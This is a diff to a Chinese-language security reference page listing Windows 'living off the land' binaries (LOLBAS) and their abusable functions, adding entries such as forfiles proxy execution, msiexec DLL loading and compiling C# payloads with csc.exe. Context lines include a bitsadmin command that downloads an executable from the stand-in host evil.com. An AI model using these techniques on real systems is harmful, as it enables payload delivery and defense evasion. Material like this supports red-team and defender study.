@@ -20,6 +20,8 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 
 常见程序
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- appsyncvpublishing.exe
+    - 执行powershell
 - bitsadmin.exe
     - 下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
     - 下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
@@ -31,18 +33,26 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
     - 证书存储相关功能
 - cmd.exe
 - cmstp.exe
+- control.exe
+    - `加载dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/>`_
 - csc.exe
+    - 编译 C# 载荷
 - cscript.exe
     - 执行脚本
-- Extexport.exe
+- extexport.exe
 - expand.exe
     - 展开一个或多个压缩文件
+- forfiles.exe
+    - ``forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe``
 - mofcomp.exe
 - msbuild.exe
     - 构建应用程序
 - mshta.exe
     - HTML应用
-- msxsl
+- msiexec.exe
+    - 安装msi
+    - 加载dll
+- msxsl.exe
     - 处理XSL程序
 - netsh.exe
 - installutil.exe
@@ -70,6 +80,7 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 - wmic.exe
     - Windows管理工具
 - windbg.exe
+- winrm.exe
 - wscript.exe
     - 脚本引擎
 - waitfor.exe
